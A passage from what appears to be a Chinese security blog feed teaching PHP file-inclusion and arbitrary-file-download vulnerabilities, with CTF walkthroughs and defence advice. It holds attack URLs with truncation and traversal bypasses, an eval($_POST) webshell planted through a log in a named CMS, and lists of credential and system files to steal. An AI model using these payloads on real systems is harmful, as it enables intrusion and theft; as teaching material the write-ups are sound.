plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">- /proc/cpuinfo：CPU 的信息 (型号, 家族, 缓存大小等) </span><br><span class="line">- /proc/meminfo：物理内存、交换空间等的信息 </span><br><span class="line">- /proc/mounts：已加载的文件系统的列表 </span><br><span class="line">- /proc/devices：可用设备的列表 </span><br><span class="line">- /proc/filesystems：被支持的文件系统 </span><br><span class="line">- /proc/modules：已加载的模块 </span><br><span class="line">- /proc/version：内核版本 </span><br><span class="line"></span><br><span class="line">- /proc/[pid]/cmdline：系统启动时输入的内核命令行参数。</span><br><span class="line">- /proc/[pid]/cwd：通过cwd命令可以直接跳转到当前目录。</span><br><span class="line">- /proc/[pid]/environ：环境变量中可能存在secret_key，这时也可以通过environ进行读取。</span><br><span class="line"></span><br><span class="line">上述路径中的PID是需要填写的进程号，当然我们不知道，但这里我们可以用 **self** 来表示我们自己现在正在用的进程。</span><br></pre></td></tr></table></figure><h3 id="包含临时文件"><a href="#包含临时文件" class="headerlink" title="包含临时文件"></a>包含临时文件</h3><p>php中上传文件，会创建临时文件。在linux下使用&#x2F;tmp目录，而在windows下使用c:\winsdows\temp目录。在临时文件被删除之前，利用竞争即可包含该临时文件。</p><p><strong>如何获取临时文件的文件名</strong>：</p><p>由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的随机函数有缺陷，而window下只有65535中不同的文件名，所以这个方法是可行的。</p><p>另一种方法是配合phpinfo页面的php variables，可以直接获取到上传文件的存储路径和临时文件名，直接包含即可。这个方法可以参考。</p><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><h3 id="黑名单（协议、路径限制）"><a href="#黑名单（协议、路径限制）" class="headerlink" title="黑名单（协议、路径限制）"></a>黑名单（协议、路径限制）</h3><p>使用 <code>str_replace()</code> 函数把 <code>http://</code>、<code>https://</code>、<code>../</code>、<code>..\</code> 替换为了空值，来防止远程文件包含和相对路径的文件包含。</p><p><strong>绕过</strong>：在 <code>http://</code> 中再嵌套一个 <code>http://</code> ，以及在 <code>../</code> 中多嵌套一个 <code>../</code>，在 URL 中输入包含的文件名为 <code>..././..././phpinfo.php</code>，则可以绕过限制；另外，也可以使用绝对路径的文件包含。</p><h3 id="固定后缀"><a href="#固定后缀" class="headerlink" title="固定后缀"></a>固定后缀</h3><p>使用<code>include ( $filename.&quot; .html&quot; );</code>之类的方式固定后缀。但是存在绕过。</p><p><strong>绕过</strong>：各种截断：%00截断、路径长度截断、问号截断、#号截断、空格绕过等。</p><h3 id="固定所要包含的文件"><a href="#固定所要包含的文件" class="headerlink" title="固定所要包含的文件"></a>固定所要包含的文件</h3><p>不传参，直接写死include的文件。</p><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><h3 id="无限制文件包含"><a href="#无限制文件包含" class="headerlink" title="无限制文件包含"></a>无限制文件包含</h3><p>无限制文件包含是指对于所包含的文件没有限制。无需绕过，可以直接进行文件包含攻击。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>利用条件</strong>:</p><p>需要 <code>allow_url_include=on</code></p><p><code>http://127.0.0.1:8080/include.php?filename=../../www.txt</code> 包含本地相对路径的文件。</p><p><code>http://127.0.0.1/test.php?filename=http://192.168.1.110/xiaohua.txt</code></p><p>包含在xiaohua.txt中的PHP代码通过远程文件包含被成功当成PHP代码解析。</p><h3 id="有限制文件包含（需要绕过）"><a href="#有限制文件包含（需要绕过）" class="headerlink" title="有限制文件包含（需要绕过）"></a>有限制文件包含（需要绕过）</h3><p>有限制文件包含是指当代码中存在特定的前缀或者.php、.html等扩展名过滤时，攻击者 <strong>需要绕过前缀或者扩展名过滤</strong>，才能执行远程URL中恶意代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">     <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">     <span class="keyword">include</span>(<span class="variable">$filename</span>.”.html”);    <span class="comment">// 在文件名后面强制增加html后缀</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>包含文件失败：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805085328234.png" alt="image-20220805085328234"></p><h4 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h4><p>%00会被认为是结束符，后面的数据会被直接忽略，导致扩展名截断。</p><p>例如：<code>http://127.0.0.1/test.php?filename=xiaohua.txt%00</code></p><p><strong>利用条件：</strong></p><ol><li><p>magic_quotes_gpc&#x3D;off</p></li><li><p>PHP&lt;5.3.4</p></li></ol><h4 id="路径长度截断"><a href="#路径长度截断" class="headerlink" title="路径长度截断"></a>路径长度截断</h4><p>操作系统存在最大路径长度的限制。可以输入超过最大路径长度的目录，这样系统就会将后面的路径丢弃，导致扩展名截断。</p><p><strong>利用条件</strong></p><p>Windows下目录的最大路径256B</p><p>Linux下目录的最大路径长度为4096B（根据服务器操作系统决定）</p><p>测试payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?filename=1.txt/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././</span><br></pre></td></tr></table></figure><p>成功绕过，执行1.txt的内容<code>&lt;?php echo phpinfo() ?&gt;</code>。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805085949121.png" alt="image-20220805085949121"></p><h4 id="点号截断"><a href="#点号截断" class="headerlink" title="点号截断"></a>点号截断</h4><p>点号截断适用于Windows系统，当点号的长度大于256B时，就可以造成扩展名截断。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805090229043.png" alt="image-20220805090229043"></p><h4 id="问号绕过"><a href="#问号绕过" class="headerlink" title="问号绕过"></a>问号绕过</h4><p>因为问号会分隔实际的 URL 和参数</p><p><code>http://127.0.0.1/include.php?filename=http://www.xiaodi8.com/readme.txt?</code></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805091001770.png" alt="image-20220805091001770"></p><h4 id="＃号绕过"><a href="#＃号绕过" class="headerlink" title="＃号绕过"></a>＃号绕过</h4><p>因为 # 表示书签</p><p><code>http://127.0.0.1/include.php?filename=http://www.xiaodi8.com/readme.txt%23</code></p><p>注意<code>#</code>要编码为<code>%23</code></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805091124899.png" alt="image-20220805091124899"></p><h4 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h4><p><code>http://127.0.0.1/include.php?filename=http://www.xiaodi8.com/readme.txt%20</code></p><p>注意空格要编码为<code>%20</code></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805091238408.png" alt="image-20220805091238408"></p><h3 id="指定前缀绕过"><a href="#指定前缀绕过" class="headerlink" title="指定前缀绕过"></a>指定前缀绕过</h3><p>使用相对路径 ..&#x2F;..&#x2F; 来返回上一目录，被称为目录遍历(Path Traversal)。</p><p>例如 <code>?file=../../phpinfo/phpinfo.php</code></p><h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><p>服务器端常常会对于<code>../</code>等做一些过滤，可以用一些编码来进行绕过。</p><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><h3 id="某CMS程序文件包含利用-黑盒"><a href="#某CMS程序文件包含利用-黑盒" class="headerlink" title="某CMS程序文件包含利用-黑盒"></a>某CMS程序文件包含利用-黑盒</h3><p>易酷CMS是一款影片播放CMS。该CMS2.5版本存在本地文件包含漏洞。我们可以利用这个漏洞，利用报错信息将一句话木马写入日志中。然后利用文件包含漏洞包含该日志文件，再用菜刀连接拿shell。</p><p>我们通过访问下面的url，将一句话木马写入日志文件中。由于文件包含时会自动将文件内容解析为php代码，所以下面的URL中并没有使用<code>&lt;?php ?&gt;</code>。该URL会发生报错：</p><p><code>http://192.168.10.22/index.php?s=my/show/id/&#123;~eval($_POST[x])&#125;</code></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805105735348.png" alt="image-20220805105735348"></p><p>然后就生成了相应的日志文件，文件存储有URL中的恶意代码：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805105845794.png" alt="image-20220805105845794"></p><p>该日志是以时间日期命名的，测试一句话木马：</p><p><code>http://192.168.10.22/index.php?s=my/show/id/../temp/logs/20_08_14.log</code></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805110122484.png" alt="image-20220805110122484"></p><p>用菜刀连接该日志文件，得到shell。</p><h3 id="CTF-南邮大"><a href="#CTF-南邮大" class="headerlink" title="CTF-南邮大"></a>CTF-南邮大</h3><p><a href="http://4.chinalover.sinaapp.com/web7/index.php">http://4.chinalover.sinaapp.com/web7/index.php</a></p><p>进入网站：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805095409995.png" alt="image-20220805095409995"></p><p>点击click me? no，发生跳转：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805095508199.png" alt="image-20220805095508199"></p><ul><li><strong>确定是否为文件包含</strong></li></ul><p>发现网站URL的参数名为file且接收一个文件名，判断可能考察文件包含。直接访问show.php看看：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805100147678.png" alt="image-20220805100147678"></p><p><strong>与<code>file=show.php</code>显示是一样的，说明<code>index.php?file=show.php</code>存在文件包含</strong>。</p><ul><li><strong>尝试包含其他文件</strong></li></ul><p>尝试使用php:&#x2F;&#x2F;input进行文件包含攻击，执行恶意php代码：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805100427271.png" alt="image-20220805100427271"></p><p>执行失败，说明存在过滤，可能检测到了php之类的关键字，或者<code>allow_url_include</code> 不为on。</p><p>尝试使用不受<code>allow_url_include</code>限制的<code>php://filter</code>读取文件，判断是哪种情况：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805101720074.png" alt="image-20220805101720074"></p><p>发现读取成功，说明是<code>allow_url_include</code> 不为on。</p><p>把读取内容base64解码，找到flag。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805101917895.png" alt="image-20220805101917895"></p><h3 id="i春秋web-include百度杯真题"><a href="#i春秋web-include百度杯真题" class="headerlink" title="i春秋web include百度杯真题"></a>i春秋web include百度杯真题</h3><p>进入题目链接：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805102613276.png" alt="image-20220805102613276"></p><p>网页给出了网站的php源码，发现存在文件包含。</p><p>尝试提交path参数，包含phpinfo.php，成功。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805103044931.png" alt="image-20220805103044931"></p><p>尝试包含index.php，成功。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805102851837.png" alt="image-20220805102851837"></p><p>发现存在index.php。改为index.phP，发现报错。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805103606874.png" alt="image-20220805103606874"></p><p>说明系统对大小写敏感，为linux系统，而且从报错信息来看也知道是linux。</p><p>进一步尝试使用<code>php://input</code>来包含恶意代码：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805103801767.png" alt="image-20220805103801767"></p><p>查看可疑文件，查看页面源代码，得到flag：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805103943697.png" alt="image-20220805103943697"></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805103953364.png" alt="image-20220805103953364"></p><p>或者也可以使用<code>php://filter</code>读取该文件：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805104100186.png" alt="image-20220805104100186"></p><p>然后base64解码即可。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805104151328.png" alt="image-20220805104151328"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;文件包含漏洞&quot;&gt;&lt;a href=&quot;#文件包含漏洞&quot; class=&quot;headerlink&quot; title=&quot;文件包含漏洞&quot;&gt;&lt;/a&gt;文件包含漏洞&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://frankcao3-picgo.oss-cn-shenzhen.aliy</summary>
      
    
    
    
    
    <category term="渗透测试" scheme="https://frankcao3.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>文件下载</title>
    <link href="https://frankcao3.github.io/posts/18452"/>
    <id>https://frankcao3.github.io/posts/18452</id>
    <published>2022-08-04T16:00:00.000Z</published>
    <updated>2023-10-06T09:09:05.981Z</updated>
    
    <content type="html"><![CDATA[<h2 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h2><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220804214515223.png" alt="image-20220804214515223"></p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>网站上文件下载功能的实现通常是通过对参数filename的值的对应，获取在服务器上所需下载的文件的绝对路径，然后读取文件内容并发送给客户端进行下载。</p><p>如果这些有下载功能的网站<strong>没有对前端用户的下载请求的文件类型、目录做合理严谨的规则进行过滤</strong>，导致用户<strong>通过路径回溯符<code>../</code>等相关操作，跳出了程序本身的限制目录</strong>，然后再利用文件下载功能，使前端下载请求可以下载服务器中的任意文件。</p><h3 id="产生条件"><a href="#产生条件" class="headerlink" title="产生条件"></a>产生条件</h3><p>网站给用户提供了下载文件的功能，并能接收相关的参数变量</p><p>后端使用了读取文件的相关函数</p><p>网站对前端用户读取文件的请求没有进行相应的控制或控制不严（限制、校验）</p><p>网站能输出请求文件的内容，提供给前端下载</p><h3 id="文件下载漏洞的挖掘"><a href="#文件下载漏洞的挖掘" class="headerlink" title="文件下载漏洞的挖掘"></a>文件下载漏洞的挖掘</h3><h4 id="寻找漏洞位置"><a href="#寻找漏洞位置" class="headerlink" title="寻找漏洞位置"></a>寻找漏洞位置</h4><p>找到有文件下载功能的网站：</p><ul><li><p>根据功能：一般可以根据下载功能去找，一些明显的软件下载网站等；</p></li><li><p>根据关键字符串：</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">download.php?path=</span><br><span class="line">download.php?file=</span><br><span class="line">down.xxx?filename=</span><br><span class="line">down.php?file=</span><br><span class="line"></span><br><span class="line">data.php?file=</span><br><span class="line">read.xxx?filename=</span><br><span class="line">readfile.php?file=</span><br><span class="line">read.php?filename=</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&amp;ReadPath=</span><br><span class="line">&amp;FilePath=</span><br><span class="line">&amp;ﬁlepath=</span><br><span class="line">&amp;Filepath=</span><br><span class="line">&amp;Path=</span><br><span class="line">&amp;path=</span><br><span class="line">&amp;inputFile=</span><br><span class="line">&amp;Inputfile=</span><br><span class="line">&amp;url=</span><br><span class="line">&amp;urls=</span><br><span class="line">&amp;Lang=</span><br><span class="line">&amp;dis=</span><br><span class="line">&amp;data=</span><br><span class="line">&amp;Data=</span><br><span class="line">&amp;readﬁle=</span><br><span class="line">&amp;ﬁlep=</span><br><span class="line">&amp;src=</span><br><span class="line">&amp;menu=</span><br><span class="line">META-INF</span><br><span class="line">WEB-INF</span><br></pre></td></tr></table></figure><h4 id="分析下载链接中的参数变量"><a href="#分析下载链接中的参数变量" class="headerlink" title="分析下载链接中的参数变量"></a>分析下载链接中的参数变量</h4><p>一般要先解码。</p><p>比如<code>http://down.znds.com/getdownurl/?s=L2Rvd24vMjAyMTExMTcveXN0XzEuNC41X2RhbmdiZWkuYXBr</code></p><p>s的值经过base64解码后得到下载文件路径：<code>down/20211117/yst_1.4.5_dangbei.apk</code></p><p>然后看参数能否修改。</p><p><strong>linux的一些系统文件路径：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/etc/passwd            //保存了系统中所有的用户信息</span><br><span class="line">/etc/shadow            //用户的密码信息</span><br><span class="line">/root/.ssh/authorized_keys               //公钥文件</span><br><span class="line">/root/.bash_history                      //用户终端操作历史记录</span><br><span class="line">/usr/local/app/apache2/conf/httpd.conf   //apache2默认配置文件</span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhosts.conf           //虚拟网站设置</span><br><span class="line">/usr/local/app/php5/lib/php.ini          //php相关设置</span><br><span class="line">/etc/httpd/conf/httpd.conf               //apache</span><br><span class="line">/etc/php5/apache2/php.ini                //ubuntu系统的默认路径</span><br></pre></td></tr></table></figure><p><strong>windows的一些系统文件路径：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">C:\boot.ini                //查看系统版本</span><br><span class="line">C:\windows\system32\inetsrv\MetaBase.xml                //查看IIS虚拟主机配置文件</span><br><span class="line">C:\windows\repair\sam                 //存储Windows系统初次安装的密码</span><br><span class="line">C:\Program Files\mysql\my.ini         //mysql配置，记录管理员登陆过的MYSQL用户名和密码</span><br><span class="line">C:\Program Files\mysql\data\mysql\user.MYD                    //mysql.user表中的数据库连接密码</span><br><span class="line">C:\windows\php.ini php.ini                                    //php配置文件</span><br><span class="line">C:\Windows\system.ini                                         //winnt的php配置信息</span><br><span class="line">C:\Windows\win.ini                                            //winnt的mysql配置文件</span><br><span class="line">C:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini         //存储虚拟主机网站路径和密码</span><br><span class="line">C:\Program Files\Apache Group\Apache\conf\httpd.conf 或C:\apache\conf\httpd.conf     //查看WINDOWS系统apache文件</span><br><span class="line">C:/Resin-3.0.14/conf/resin.conf                               //查看jsp开发的网站resin文件配置信息.</span><br><span class="line">C:\Windows\System32\drivers\etc\hostswinserver                //配置Telnet信息</span><br></pre></td></tr></table></figure><p><strong>tomcat的一些配置文件的路径：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">apache-tomcat-8.5.51/conf/tomcat-users.xml              //tomcat的角色(授权用户)配置文件</span><br><span class="line">apache-tomcat-8.5.51/conf/server.xml                    //tomcat的主配置文件</span><br><span class="line">apache-tomcat-8.5.51/conf/web.xml                       //tomcat应用程序的部署描述符文件</span><br><span class="line">apache-tomcat-8.5.51/logs/catalina.out</span><br><span class="line">// 即tomcat的标准输出和标准出错，所有输出到这两个位置的都会进入catalina.out，这里包含tomcat运行自己输出的日志以及应用里向console输出的日志。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">apache：</span><br><span class="line">    /etc/httpd/conf/httpd.conf</span><br><span class="line">    /etc/apache2/httpd.conf</span><br><span class="line">    /etc/apache2/apache2.conf</span><br><span class="line">nginx：</span><br><span class="line">    /etc/nginx/nginx.conf</span><br><span class="line">    /usr/local/nginx/conf/nginx.conf</span><br><span class="line">    /usr/local/etc/nginx/nginx.conf</span><br><span class="line">redis：</span><br><span class="line">    /etc/redis.conf</span><br><span class="line">    index.php?f=../../../../../../etc/passwd </span><br></pre></td></tr></table></figure><h3 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h3><p><strong>下载服务器的任意文件</strong>：</p><p>获得网站<strong>web源码</strong>，再对代码进行审计，以获得更多的漏洞</p><p>获得网站、服务器、系统、数据库等<strong>中间件配置文件</strong></p><p>获得应用的<strong>系统配置文件</strong></p><p><strong>内网探测</strong></p><p>下载各种.log文件，并寻找后台地址、文件上传点等地方</p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>以pikachu为例：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220811205457049.png" alt="image-20220811205457049"></p><h4 id="分析下载文件的URL"><a href="#分析下载文件的URL" class="headerlink" title="分析下载文件的URL"></a>分析下载文件的URL</h4><p>直接在网站上查看图片，可以知道图片在网站内的存储地址：<code>http://10.1.1.7/vul/unsafedownload/download/rayal.png</code></p><p>该图片的下载链接为：<code>http://127.0.0.1/pikachu-master/vul/unsafedownload/execdownload.php?filename=rayal.png</code></p><h4 id="测试能否下载其他文件"><a href="#测试能否下载其他文件" class="headerlink" title="测试能否下载其他文件"></a>测试能否下载其他文件</h4><p>通过上面的两个下载的地址我们可以可以测试文件下载漏洞：</p><p><code>http://10.1.1.7/vul/unsafedownload/execdownload.php?filename=../execdownload.php</code></p><p>根据上面的分析通过链接下载到了文件<code>execdownload.php</code>。</p><p>很明显filename参数这里存在文件下载漏洞。</p><h4 id="扫描网站目录"><a href="#扫描网站目录" class="headerlink" title="扫描网站目录"></a>扫描网站目录</h4><p>接下来可以使用御剑、铸剑等工具进行探针，看一看存在哪些敏感文件，构造我们所需要的下载链接：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220811212858165.png" alt="image-20220811212858165"></p><h4 id="下载敏感文件进一步攻击"><a href="#下载敏感文件进一步攻击" class="headerlink" title="下载敏感文件进一步攻击"></a>下载敏感文件进一步攻击</h4><p>下载好的文件代码中去分析路径和文件包含。</p><p>举例：config.php配置文件—&gt;得到数据库密码—&gt;连接数据库</p><p><code>http://127.0.0.1/pikachu-master/vul/unsafedownload/execdownload.php?filename=../../inc/function.php</code></p><p>下载成功：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220811212931057.png" alt="image-20220811212931057"></p><h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><ol><li><p>净化数据：</p><p>对用户传过来的<strong>文件名参数进行统一编码</strong></p><p><strong>对文件类型进行白名单控制</strong></p><p>对包含恶意字符或者空字符的参数进行拒绝。比如**过滤.(点)**，使用户在url中不能回溯上级目录，正则严格判断用户输入参数的格式。</p></li><li><p>要下载的文件地址保存至数据库中，与网站目录隔开。</p></li><li><p>文件路径保存至数据库，让用户提交文件对应ID下载文件。</p></li><li><p>用户下载文件之前需要进行<strong>权限判断</strong>。</p></li><li><p>文件放在web无法直接访问的目录下。</p></li><li><p>不允许提供目录遍历服务。</p></li><li><p>公开文件可放置在web应用程序下载目录中通过链接进行下载。</p></li><li><p>php.ini配置open_basedir限定文件访问范围。</p></li></ol><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p><a href="https://blog.csdn.net/m0_62619269/article/details/125043182">https://blog.csdn.net/m0_62619269/article/details/125043182</a></p><p><strong>[RoarCTF 2019]Easy Java</strong></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220812093558024.png" alt="image-20220812093558024"></p><p>登录界面尝试SQL注入，没有注入点，点击help：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220812093722952.png" alt="image-20220812093722952"></p><ul><li><p><strong>分析文件下载URL</strong></p><p>URL中存在filename参数，推测可能存在文件下载漏洞。</p><p>该链接以get请求文件，但是失败，因为Java一般文件下载以post方式提交。</p><p>所以尝试用POST方式来进行请求，发现可以下载文件。下载了一个help.docx的文件。</p></li></ul><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220812094228417.png" alt="image-20220812094228417"></p><ul><li><p><strong>尝试下载其他文件</strong></p><p>这里要用到 <strong>web-inf</strong> 的知识：</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">这里对WEB-INF进行一个简单的了解。</span><br><span class="line"></span><br><span class="line">WEB-INF是java的WEB应用的安全目录。</span><br><span class="line">1.WEB-INF/web.xml:web应用程序配置文件，描述了servlet和其他的应用组件配置及命名规则。</span><br><span class="line">2.WEB-INF/classes:包含了站点所有用的class文件，包括servlet class和非servlet class</span><br><span class="line">3.WEB-INF/lib:存放web应用需要的JAR文件</span><br><span class="line">4.WEB-INF/src:源码目录，按照包名结构放置各个java文件</span><br><span class="line">5.WEB-INF/database.properties:数据库配置文件</span><br><span class="line">6.WEB-INF/tags:存放了自定义标签文件</span><br><span class="line">7.WEB-INF/jsp:jsp 1.2 一下版本的文件存放位置。</span><br><span class="line">8.WEB-INF/jsp2:存放jsp2.0以下版本的文件。</span><br><span class="line">9.META-INF:相当于一个信息包。</span><br></pre></td></tr></table></figure><p>尝试将参数的值换为<code>WEB-INF/web.xml</code>，发现成功返回内容。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>FlagController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.wm.ctf.FlagController<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br></pre></td></tr></table></figure><p>分析文件内容发现可疑class文件。</p><p>构造payload：<code>filename=/WEB-INF/classes/com/wm/ctf/FlagController.class</code>，下载FlagController.class。</p><p>下载后，文件内容中存在base64编码：</p><p><code>String flag = &quot;ZmxhZ3thNTkzMTBiMy1lZjkzLTQ5ODktOTVlMC0zYTQ2ZmZhMThiYjh9Cg==&quot;;</code></p><p>解码即可得到flag。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;文件下载&quot;&gt;&lt;a href=&quot;#文件下载&quot; class=&quot;headerlink&quot; title=&quot;文件下载&quot;&gt;&lt;/a&gt;文件下载&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com</summary>
      
    
    
    
    
    <category term="渗透测试" scheme="https://frankcao3.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>文件读取</title>
    <link href="https://frankcao3.github.io/posts/15275"/>
    <id>https://frankcao3.github.io/posts/15275</id>
    <published>2022-08-04T16:00:00.000Z</published>
    <updated>2023-10-06T09:09:05.981Z</updated>
    
